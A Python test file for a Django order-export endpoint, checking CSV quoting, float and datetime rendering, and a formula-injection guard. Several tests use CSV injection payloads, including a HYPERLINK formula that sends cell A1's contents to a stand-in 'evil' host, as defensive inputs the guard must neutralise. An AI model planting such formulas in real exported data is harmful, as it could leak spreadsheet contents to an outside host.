"""FR-R005 — canonical CSV export tests (ROADLOG R-005, docs/csv-export.md).

Two layers, deliberately tested differently:

1. The WRITER (pure, no DB): csv_text/csv_cell must emit exactly what
   app/src/lib/csv.ts emits for the same cells — the vitest suite in
   app/src/lib/__tests__/csv.test.ts pins the identical strings, so the two
   halves of the contract are held to one byte-level spec (QUOTE_MINIMAL,
   CRLF, RFC 4180 doubled quotes, empty for null, lowercase booleans,
   formula guard on text only).
2. The ENDPOINT GET /api/orders/export/ — line-level (child rows with the
   parent ids repeated), whole collection, primary-key order, ?search=
   honoured, pagination ignored, text/csv + attachment + UTF-8 BOM, and the
   OpenAPI shape the thin client binds its button to.

Infrastructure note (same as test_audit_actions): conftest mounts the demo
rig apps in-memory and scopes the rig URLconf/DRF policy to this module;
the test database comes from Django's own DiscoverRunner — pytest-django is
deliberately not a dependency.
"""
import csv
import io
import json
from datetime import datetime, timedelta
from datetime import timezone as dt_timezone
from decimal import Decimal
from uuid import uuid4

import pytest
from django.contrib.auth.models import User
from django.core.management import call_command
from django.db import transaction
from django.test.runner import DiscoverRunner
from django.test.utils import override_settings, setup_test_environment, teardown_test_environment
from django.urls import reverse
from django.utils import timezone
from rest_framework.test import APIClient

from shop.csv_export import ORDER_EXPORT_HEADER, csv_cell, csv_text
from shop.models import Category, Customer, Order, OrderHistory, Product


# ---------------------------------------------------------------------------
# database plumbing
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def demo_db():
    setup_test_environment()
    runner = DiscoverRunner(interactive=False, verbosity=0)
    old_config = runner.setup_databases()
    yield
    runner.teardown_databases(old_config)
    teardown_test_environment()


@pytest.fixture
def db(demo_db):
    with transaction.atomic():
        yield
        transaction.set_rollback(True)


@pytest.fixture
def api(db):
    return APIClient()


@pytest.fixture
def user(db):
    return User.objects.create_user("exp1", "exp1@example.com", "pw12345")


@pytest.fixture
def auth_api(api, user):
    api.force_authenticate(user=user)
    return api


@pytest.fixture
def order(db):
    return make_order(notes="seeded")


def make_order(**kw):
    """ORM-built order: no history row, created_at NULL — the shapes an
    export has to cope with (a record with no child rows still ships)."""
    cat = Category.objects.create(name=f"cat-{uuid4().hex[:8]}")
    product = Product.objects.create(
        category=cat,
        name=kw.pop("product_name", "Thing"),
        price=Decimal("19.99"),
        stock=5,
    )
    customer = Customer.objects.create(
        name=kw.pop("customer", "Cust"), email=f"{uuid4().hex[:8]}@example.com"
    )
    defaults = {"total": Decimal("0.00"), "status": Order.Status.PENDING}
    defaults.update(kw)
    return Order.objects.create(customer=customer, product=product, **defaults)


def export_url():
    return reverse("order-export")


def col(name):
    """Column index BY HEADER NAME.

    The parent block grew the FR-R005 `weight` column, which silently re-pointed
    every hand-written index at its neighbour — a literal `7` cannot fail when
    the column it named moved one seat right, so the cell tests look names up.
    """
    return ORDER_EXPORT_HEADER.index(name)


def read_csv(body: str):
    """Parse a document back with the stdlib reader — the round trip is the test."""
    return list(csv.reader(io.StringIO(body)))


@pytest.fixture
def utc_project_timezone():
    """Pin the timezone context the literal expectations are written in.

    DRF renders every datetime in the PROJECT timezone and this writer mirrors
    DRF, so a literal like "2026-10-20T21:00:00Z" is only true under
    TIME_ZONE="UTC" — which the shipped rig declares (core/settings.py:76) but
    conftest.py never sets, leaving Django's own default (America/Chicago). Under
    that default the shared golden document fails on the machine rather than on
    the code, so the pin is explicit wherever a literal is asserted.
    """
    with override_settings(TIME_ZONE="UTC"):
        yield


# ---------------------------------------------------------------------------
# 1. the writer, pinned byte for byte against app/src/lib/csv.ts
# ---------------------------------------------------------------------------

class TestCsvWriterParity:
    def test_crlf_and_minimal_quoting(self):
        # csv_text always terminates the document; buildCsv() in the client
        # does the same, so a downloaded file diffs clean against an export.
        assert csv_text([["id", "name"], [1, "a"], [2, "b"]]) == "id,name\r\n1,a\r\n2,b\r\n"

    def test_quotes_on_comma_quote_and_line_breaks(self):
        assert csv_text([["a,b"]]) == '"a,b"\r\n'
        assert csv_text([['say "hi"']]) == '"say ""hi"""\r\n'
        assert csv_text([["line1\nline2"]]) == '"line1\nline2"\r\n'

    def test_whitespace_is_left_bare(self):
        # Probed: Python QUOTE_MINIMAL does not quote padded text, so the TS
        # writer must not either — the two layers have to agree.
        assert csv_text([["  padded  "]]) == "  padded  \r\n"

    def test_null_is_empty_not_a_word(self):
        # The one documented carve-out: Python quotes a row that is exactly one
        # empty field ('""') so the line cannot collapse into nothing. Any
        # reader gives back "" either way, and a real export row is never
        # single-column — multi-column empties come out bare, like buildCsv().
        assert csv_text([[None]]) == '""\r\n'
        assert csv_text([["id", None]]) == "id,\r\n"

    def test_booleans_are_machine_readable(self):
        assert csv_cell(True) == "true"
        assert csv_cell(False) == "false"

    def test_decimal_keeps_its_serial_form(self):
        assert csv_cell(Decimal("19.99")) == "19.99"

    def test_formula_guard_covers_text_but_not_numbers(self):
        assert csv_cell("+cmd") == "'+cmd"
        assert csv_cell("@SUM(A1)") == "'@SUM(A1)"
        assert csv_cell(Decimal("-5.00")) == "-5.00"  # a number is a number
        assert csv_cell("normal - dash") == "normal - dash"

    def test_guard_is_by_shape_not_python_type(self):
        """`=HYPERLINK(...)` is text, an apostrophe-neutralised cell.

        The type-based rule alone is not enough: DRF answers a DecimalField with
        the STRING "19.99", so the same data reaches layer 1 (client, sees a
        string) and layer 2 (server, sees a Decimal) as different Python/JS
        types. Byte-identity therefore hangs on the SHAPE of the text, and a
        numeric-shaped string must stay bare on both sides or every negative
        price in a customer export would differ between the two buttons.
        """
        assert csv_cell("=HYPERLINK(\"http://evil/\"+A1)").startswith("'=")
        assert csv_cell("-5.00") == "-5.00"  # DRF's decimal, as a string
        assert csv_cell("+19.99") == "+19.99"
        assert csv_cell("-.5") == "-.5"
        assert csv_cell("-7,25") == "'-7,25"  # a comma is not a number
        assert csv_cell("-2+3") == "'-2+3"  # the classic payload
        assert csv_cell("-IF(1,2,3)") == "'-IF(1,2,3)"
        assert csv_cell("-") == "'-"  # a lone lead character is not a number

    # A FloatField is the one value type the two export layers can disagree on
    # WITHOUT either side looking broken: DRF puts a float in the JSON body, the
    # browser parses it and `String()`s it for layer 1, while layer 2 formats it
    # in Python. Every row below is the ECMAScript rendering (verified with
    # node's String()), pinned again by FLOAT_PARITY in
    # app/src/lib/__tests__/csv.test.ts, so a drift on either side names itself.
    FLOAT_PARITY = [
        (0.0, "0"),
        (-0.0, "0"),  # String(-0) is "0", not "-0"
        (1.0, "1"),  # str(1.0) is "1.0" — the commonest divergence
        (100.0, "100"),
        (1e6, "1000000"),
        (19.99, "19.99"),
        (48.5, "48.5"),
        (0.5, "0.5"),
        (1 / 3, "0.3333333333333333"),
        (0.1 + 0.2, "0.30000000000000004"),  # shortest round trip, both sides
        (1e-5, "0.00001"),  # Python reprs this as 1e-05
        (1e-6, "0.000001"),
        (1e-7, "1e-7"),  # Python pads the exponent: 1e-07
        (-1e-9, "-1e-9"),
        (2.5e-13, "2.5e-13"),
        (1e16, "10000000000000000"),
        (1e17, "100000000000000000"),  # Python switches to 1e+17
        (1e20, "100000000000000000000"),
        (1e21, "1e+21"),
        (6.02e23, "6.02e+23"),
        (1e100, "1e+100"),
        (1.7976931348623157e308, "1.7976931348623157e+308"),
        (5e-324, "5e-324"),
        (123456789012345680000.0, "123456789012345680000"),
        (-0.00042, "-0.00042"),
    ]

    @pytest.mark.parametrize("value,expected", FLOAT_PARITY)
    def test_float_is_rendered_the_way_the_client_renders_it(self, value, expected):
        assert csv_cell(value) == expected

    @pytest.mark.parametrize("value,expected", FLOAT_PARITY)
    def test_floats_are_never_formula_guarded(self, value, expected):
        """The guard is for TEXT (csv_export's own docstring says so).

        A negative float in exponent form ("-1e-9") is not numeric-shaped, so a
        guard keyed on the rendered text alone apostrophises server-side what
        the browser leaves bare — a second divergence hiding behind the first.
        """
        assert not expected.startswith("'")
        assert csv_cell(value) == expected

    @pytest.mark.usefixtures("utc_project_timezone")
    def test_the_shared_golden_document(self):
        """One document, asserted twice: here and in csv.test.ts.

        Values were chosen to force every quoting/guard branch at once (int,
        padded-free text, comma text, embedded quote, embedded newline, bool,
        NULL, positive and negative Decimal, numeric-shaped STRING, formula
        payload, an AWARE datetime and the same instant as TEXT, and three floats
        whose Python `str()` forms are NOT what a browser writes for the same
        JSON number). The `when` column is deliberately doubled — one row a
        datetime object, one row the string a browser actually receives — because
        a golden document whose datetime cell is text on BOTH sides cannot see the
        rendering rule at all (that blind spot is divergence #2, see
        TestDatetimeOverTheWire). The literal below was produced by this writer
        and is reproduced byte for byte by buildCsv(); if either side drifts,
        exactly one of the two suites goes red and names the layer.
        """
        header = ["id", "name", "notes", "active", "total", "when", "weight"]
        rows = [
            [1, "Widget", "plain", True, Decimal("19.99"),
             datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone.utc), 1.0],
            [2, "Gizmo, big", 'say "hi"', False, Decimal("-5.00"), None, -0.5],
            [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', True, "-7.25",
             "2026-10-20T21:00:00Z", 1e-7],
        ]
        assert csv_text([header] + [[csv_cell(v) for v in row] for row in rows]) == (
            "id,name,notes,active,total,when,weight\r\n"
            "1,Widget,plain,true,19.99,2026-10-20T21:00:00Z,1\r\n"
            '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n'
            "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\","
            "true,-7.25,2026-10-20T21:00:00Z,1e-7\r\n"
        )


# ---------------------------------------------------------------------------
# 2. the endpoint
# ---------------------------------------------------------------------------

class TestExportEndpointBasics:
    def test_url_resolves_under_the_orders_list_path(self):
        assert export_url() == "/api/orders/export/"

    def test_unauthenticated_is_rejected(self, api, db):
        assert api.get(export_url()).status_code == 401

    def test_accept_text_csv_is_negotiable(self, auth_api, db):
        """The header the SHIPPED thin client sends must not 406.

        DRF negotiates in ``initialize_request()`` — before the view body runs —
        so an action that returns a plain ``HttpResponse`` still needs a renderer
        class whose ``media_type`` matches the request. With the default
        ``JSONRenderer``/``BrowsableAPIRenderer`` pair, ``Accept: text/csv``
        raised ``NotAcceptable``: measured on the live demo rig, and invisible to
        every APIClient test above because APIClient sends ``Accept: */*``.
        """
        response = auth_api.get(export_url(), HTTP_ACCEPT="text/csv")
        assert response.status_code == 200, response.content[:200]
        assert response["Content-Type"] == "text/csv; charset=utf-8"

    def test_accept_with_quality_fallback_negotiates_the_csv_renderer(self, auth_api, db):
        """``text/csv, */*;q=0.8`` (the client's real header, widened so a
        customer backend that forgot the renderer still answers) must prefer the
        exact match rather than falling through to JSON."""
        response = auth_api.get(export_url(), HTTP_ACCEPT="text/csv, */*;q=0.8")
        assert response.status_code == 200
        assert response["Content-Type"] == "text/csv; charset=utf-8"

    def test_a_browser_address_bar_hit_still_downloads(self, auth_api, db):
        # Regression guard for the fix above: adding a renderer class overrides
        # the viewset default pair, and dropping the browser-only one would turn
        # a manual download into a 406 for every human who pastes the URL.
        response = auth_api.get(
            export_url(),
            HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        )
        assert response.status_code == 200
        assert response["Content-Type"] == "text/csv; charset=utf-8"

    def test_an_unnegotiable_accept_is_still_refused(self, auth_api, db):
        # The guard is not being widened into "answer anything": a PDF request
        # is a client that cannot read this endpoint's body.
        assert auth_api.get(export_url(), HTTP_ACCEPT="application/pdf").status_code == 406

    def test_answers_a_csv_attachment_with_a_bom(self, auth_api, db):
        make_order(notes="first")
        response = auth_api.get(export_url())
        assert response.status_code == 200
        assert response["Content-Type"] == "text/csv; charset=utf-8"
        assert response["Content-Disposition"] == 'attachment; filename="orders-line.csv"'
        body = response.content.decode("utf-8")
        assert body.startswith("\ufeff"), "Excel needs the BOM to read UTF-8"
        assert body.endswith("\r\n") or body.count("\r\n") >= 1
        assert "\r\n" in body, "RFC 4180 line endings"

    def test_header_is_the_documented_column_contract(self, auth_api, db):
        make_order()
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert rows[0] == ORDER_EXPORT_HEADER

    def test_parent_columns_come_first_then_child(self, auth_api, db):
        assert ORDER_EXPORT_HEADER[:10] == [
            "order_id", "customer_id", "customer", "product_id", "product",
            "status", "total", "weight", "notes", "created_at",
        ]
        assert ORDER_EXPORT_HEADER[-5] == "history_id", "child block starts after the parent"
        # FR-R005: the float witness column sits inside the PARENT block, next to
        # the decimal it must not be confused with — both layers carry it.
        assert "weight" in ORDER_EXPORT_HEADER[:10]


class TestLineLevelShape:
    def test_one_row_per_history_entry_with_parent_ids_repeated(self, auth_api, order, user):
        """order fixture came from the API-less ORM (no history), so drive two
        transitions through the R-001 machine and expect the trail flattened."""
        OrderHistory.objects.create(order=order, from_status="", to_status="pending", actor=user)
        OrderHistory.objects.create(order=order, from_status="pending", to_status="paid", actor=user)
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
        assert len(mine) == 2
        assert mine[0][: col("history_id")] == mine[1][: col("history_id")], "parent block must repeat verbatim"
        # creation entry first, then the move: child order is replay order, not
        # insertion order of the join
        assert [r[col("from_status")] for r in mine] == ["", "pending"]
        assert [r[col("to_status")] for r in mine] == ["pending", "paid"]
        assert [r[col("history_actor")] for r in mine] == ["exp1", "exp1"]

    def test_an_order_with_no_history_still_gets_a_row(self, auth_api, order):
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
        assert len(mine) == 1
        assert mine[0][col("history_id"):] == ["", "", "", "", ""], "empty child columns, never a dropped record"

    def test_stable_order_is_primary_key_order(self, auth_api, db):
        ids = [make_order(notes=f"n{i}").pk for i in range(3)]
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        exported = [int(r[0]) for r in rows[1:] if r]
        assert exported == sorted(ids), "an export must diff against the next export"


class TestCollectionScope:
    def test_whole_collection_not_one_page(self, auth_api, db):
        for i in range(12):  # PAGE_SIZE is 10
            make_order(notes=f"bulk-{i}")
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert len([r for r in rows[1:] if r]) == 12

    def test_search_filter_is_honoured(self, auth_api, db):
        make_order(notes="alpha-unique")
        make_order(notes="beta-unique")
        rows = read_csv(auth_api.get(export_url(), {"search": "alpha-unique"}).content.decode("utf-8-sig"))
        body = [r for r in rows[1:] if r]
        assert len(body) == 1
        assert body[0][col("notes")] == "alpha-unique"

    def test_export_body_carries_no_pagination_wrapper(self, auth_api, db):
        make_order()
        text = auth_api.get(export_url()).content.decode("utf-8-sig")
        assert '"count"' not in text and "results" not in text


class TestCellFidelity:
    def test_rfc4180_round_trip_through_the_stdlib_reader(self, auth_api, order):
        order.notes = 'gift, please\nwrap "nicely"'
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        cell = [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")]
        assert cell == 'gift, please\nwrap "nicely"'

    def test_decimal_total_is_not_reflowed_through_float(self, auth_api, order):
        order.total = Decimal("19.99")
        order.save(update_fields=["total"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("total")] == "19.99"

    def test_a_formula_looking_note_is_neutralised(self, auth_api, order):
        order.notes = "=HYPERLINK(\"http://evil/\"+A1)"
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")].startswith("'=")

    def test_null_created_at_is_an_empty_field(self, auth_api, order):
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("created_at")] == ""

    def test_long_notes_are_never_truncated(self, auth_api, order):
        order.notes = "x" * 300
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert len([r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")]) == 300

    def test_a_null_float_is_empty_not_zero(self, auth_api, order):
        """NULL weight -> empty field, never "0" or "None" (the null rule
        applies to a float exactly as it does to a date)."""
        order.weight = None
        order.save(update_fields=["weight"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("weight")] == ""


# ---------------------------------------------------------------------------
# 2b. the float, over the wire — the FR-R005 parity proven through the model
# field and the real endpoint rather than through the writer alone. Nothing
# before this class proved a float ever REACHES csv_cell() as a float, which is
# precisely the condition that makes the two export layers differ.
#
# Derived from the writer's own FLOAT_PARITY table (one source of truth, per
# docs/csv-export.md §2), narrowed to the values the seeded rig actually holds
# and which hit each rendering switch point once: integral, plain fraction,
# exponent switch, long-form switch, negative sub-unit (the guard trap).
# ---------------------------------------------------------------------------

WIRE_VALUES = [
    pair for pair in TestCsvWriterParity.FLOAT_PARITY
    if pair[0] in {1.0, 19.99, 1e-7, 1e17, -0.00042}
]


class TestFloatOverTheWire:
    @pytest.mark.parametrize("value,expected", WIRE_VALUES)
    def test_exported_float_matches_the_browser_rendering(
        self, auth_api, db, value, expected
    ):
        """Store -> GET export: one float, byte-identical to ``String()``.

        The value reaches the file through the model field, so this asserts the
        chain the writer-only table above cannot see: the DB stores the double,
        ``order_export_rows`` reads it as a ``float`` (not a str, not a Decimal),
        and the writer emits the ECMAScript form.
        """
        order = make_order(weight=value)
        body = auth_api.get(export_url()).content.decode("utf-8-sig")
        cell = [r for r in read_csv(body)[1:] if r and r[0] == str(order.pk)][0][col("weight")]
        assert cell == expected
        assert not cell.startswith("'"), "a number never carries the formula guard"

    @pytest.mark.parametrize("value", [1.0, 1e-7, 1e17])
    def test_the_python_repr_is_the_string_that_used_to_diverge(self, value):
        """Counter-example, kept honest: on these three values Python's own
        ``str()`` is NOT what the browser writes, so a writer that regressed to
        ``str()`` would fail the test above rather than pass it by luck."""
        expected = dict(WIRE_VALUES)[value]
        assert str(value) != expected

    def test_the_wire_subset_still_covers_every_switch_point(self):
        """If FLOAT_PARITY is ever edited so a switch point disappears, the
        filter above silently shrinks this class instead of failing — so the
        coverage is asserted, not assumed."""
        assert len(WIRE_VALUES) == 5, [text for _, text in WIRE_VALUES]

    def test_json_body_carries_the_float_as_a_number_not_a_string(self, auth_api, db):
        """The premise of the whole FR-R005 float rule, measured live.

        Layer 1 can only disagree with layer 2 because JSONRenderer sends a
        FloatField as a JSON NUMBER while a DecimalField arrives as a STRING:
        the browser parses one and quotes the other. If a future change made
        floats strings, the client's `typeof value === "string"` guard would be
        dead code and this test says so before the two layers quietly re-split.
        """
        order = make_order(weight=1.0)
        order.total = Decimal("19.99")
        order.save(update_fields=["total"])
        response = auth_api.get("/api/orders/", HTTP_ACCEPT="application/json")
        assert response.status_code == 200
        row = next(r for r in json.loads(response.content)["results"] if r["id"] == order.pk)
        assert isinstance(row["weight"], float), "a float crosses the wire as a number"
        assert isinstance(row["total"], str), "a decimal crosses the wire as a string"

    def test_the_serializer_round_trip_keeps_the_double(self, auth_api, db):
        """POST /api/orders/ with a float body -> the stored value re-renders
        as the same double, so the parity is about presentation only."""
        cat = Category.objects.create(name=f"cat-{uuid4().hex[:8]}")
        product = Product.objects.create(category=cat, name="P", price=Decimal("1.00"), stock=1)
        customer = Customer.objects.create(name="C", email=f"{uuid4().hex[:8]}@example.com")
        response = auth_api.post(
            "/api/orders/",
            {"customer": customer.pk, "product": product.pk, "total": "1.00", "weight": 0.1 + 0.2},
            format="json",
        )
        assert response.status_code == 201, response.content[:200]
        created = response.json()
        assert created["weight"] == 0.1 + 0.2
        body = auth_api.get(export_url()).content.decode("utf-8-sig")
        cell = [r for r in read_csv(body)[1:] if r and r[0] == str(created["id"])][0][col("weight")]
        assert cell == "0.30000000000000004", "shortest round trip, both sides"


# ---------------------------------------------------------------------------
# 2c. the SECOND divergence the live rig surfaced (segment 2026-10-21, the
# cross-twin diff over seeded rows). It is not about floats and the writer-only
# parity table structurally could not see it: the `when` cell in the golden
# document is a STRING on the JS side — because a browser can only ever receive
# text — while the Python side handed csv_cell a datetime OBJECT. Both twins
# passed the text through and the table stayed green while every real row
# differed. Layer 1 writes DRF's ISO form; DRF spells UTC "Z", and
# datetime.isoformat() spells it "+00:00".
# ---------------------------------------------------------------------------

@pytest.mark.usefixtures("utc_project_timezone")
class TestDatetimeOverTheWire:
    # (value handed to csv_cell, exact text DRF's own JSON body carries for it).
    # That text is a function of the PROJECT timezone — DRF renders every
    # datetime in it — so the table runs under the setting the shipped rig
    # declares (core/settings.py:76 TIME_ZONE="UTC") rather than whatever the
    # test environment carries: conftest.py sets no TIME_ZONE and Django's own
    # default is America/Chicago, which rendered these rows "-05:00" and looked
    # like a writer bug instead of a pin missing.
    ISO_PARITY = [
        (datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone.utc), "2026-10-20T21:00:00Z"),
        (datetime(2026, 10, 20, 21, 0, 5, 123456, tzinfo=dt_timezone.utc),
         "2026-10-20T21:00:05.123456Z"),
        # an aware non-UTC value: DRF renders it in the project timezone
        # (TIME_ZONE="UTC" here) — the same instant, UTC bytes.
        (datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone(timedelta(hours=6))),
         "2026-10-20T15:00:00Z"),
        # a naive value: DRF makes it aware in the project timezone first.
        (datetime(2026, 10, 20, 21, 0), "2026-10-20T21:00:00Z"),
        # a DATE is not a DATETIME — no time part, no offset to re-spell.
        (datetime(2026, 10, 20).date(), "2026-10-20"),
    ]

    @pytest.mark.parametrize("value,expected", ISO_PARITY)
    def test_datetime_is_rendered_the_way_drf_renders_it(self, value, expected):
        assert csv_cell(value) == expected

    @pytest.mark.parametrize("project_tz", ["UTC", "America/Chicago"])
    def test_the_csv_cell_equals_the_json_body_for_the_same_record(
        self, auth_api, db, user, project_tz
    ):
        """The rule behind the table, over the wire: for one record the datetime
        text in the CSV must be the text the SAME API put in its JSON body — byte
        for byte, neither layer re-spelling the other's value — in ANY project
        timezone. Run twice on purpose: pinning UTC would have proved the very
        claim it makes, and the offset form is where a UTC-only test is blind."""
        order = make_order(created_at=timezone.now())
        OrderHistory.objects.create(order=order, from_status="", to_status="pending", actor=user)
        with override_settings(TIME_ZONE=project_tz):
            json_row = next(
                r for r in json.loads(
                    auth_api.get("/api/orders/", HTTP_ACCEPT="application/json").content
                )["results"] if r["id"] == order.pk
            )
            trail = json.loads(
                auth_api.get(
                    f"/api/orders/{order.pk}/history/", HTTP_ACCEPT="application/json"
                ).content
            )
            row = [
                r for r in read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))[1:]
                if r and r[0] == str(order.pk)
            ][0]
        assert row[col("created_at")] == json_row["created_at"]
        assert row[col("history_created_at")] == trail[0]["created_at"]
        assert row[col("created_at")] != order.created_at.isoformat(), (
            "the writer emitted DRF's text, not the model value's own isoform — "
            "the re-spelling that made every datetime column of a real export differ"
        )
        if project_tz == "UTC":
            assert row[col("created_at")].endswith("Z")


class TestSchemaContract:
    def test_export_path_is_documented_as_get_only_csv(self, tmp_path):
        """The client binds its server-export button from exactly this shape:
        a GET at <listPath>export/ answering text/csv, and NO POST (which
        would make drf-spectacular's path look like a model list endpoint)."""
        out = tmp_path / "schema.json"
        call_command("spectacular", "--format", "openapi-json", file=str(out))
        schema = json.loads(out.read_text())
        path = schema["paths"]["/api/orders/export/"]
        assert set(path.keys()) == {"get"}, path.keys()
        content = path["get"]["responses"]["200"]["content"]
        assert "text/csv" in content
        assert "application/json" not in content
